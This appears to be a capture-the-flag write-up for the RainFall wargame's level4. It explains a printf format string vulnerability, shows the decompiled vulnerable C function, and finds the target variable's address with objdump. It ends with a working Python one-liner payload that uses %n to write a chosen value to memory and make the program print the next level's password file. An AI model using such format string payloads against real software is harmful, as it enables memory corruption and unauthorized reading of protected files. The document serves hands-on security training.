# level4

This level is pretty much the same as the previous one.

However, instead of writing 64 chars we have to write 16930116 chars.

`printf` will take ages to print all these characters, so we have to find a way to speed up the process. Fortunately, there is a way to do this using two format specifiers:

```c
void n(void)
{
  char buffer[520];
  
  fgets(buffer, 512, stdin);
  p(buffer);
  if (m == 16930116) {
    system("/bin/cat /home/user/level5/.pass");
  }
  return;
}

void p(char *s)
{
  printf(s);
  return;
}
```

We need the address of the `m` variable, so using `objdump` we can find it:

```bash
level4@RainFall:~$ objdump -t level4 | grep m
08049810 g     O .bss   00000004              m
```

We can use a small trick using the %NNNd format specifier.

```python
python -c 'print "\x10\x98\x04\x08"+"%16930112d%12$n"' | ./level4
```